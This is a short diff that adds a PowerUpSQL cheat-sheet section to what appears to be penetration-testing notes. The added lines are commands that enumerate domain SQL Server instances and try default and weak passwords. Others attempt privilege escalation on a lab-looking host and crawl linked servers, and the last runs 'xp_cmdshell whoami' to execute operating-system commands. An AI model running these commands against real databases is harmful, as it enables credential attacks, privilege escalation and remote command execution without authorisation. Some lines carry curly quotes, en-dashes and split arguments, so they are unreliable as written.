@@ -43,10 +43,20 @@ nbtscan -r 172.16.13.0/24
 
 
 
+SQL Instances through PowerupSQL
+
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose –Threads 10 | Where-Object {$_.Status –eq ‘Accessible’}
+Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw –Verbose
+Invoke-SQLAuditWeakLoginPw
+Invoke-SQLEscalatePriv -Verbose -Instance "APP02.sbcloudlab.com"
+Invoke-SQLAudit -Verbose -Instance "APP02.sbcloudlab.com"
 
 
-
-
+Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008“
+Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008"
+-Query “select * from master..sysdatabases”
+Get-SQLServerLinkCrawl -Verbose -Instance "10.1.1.1\SQLSERVER2008"
+-Query “exec master..xp_cmdshell ‘whoami’”
 
 
 
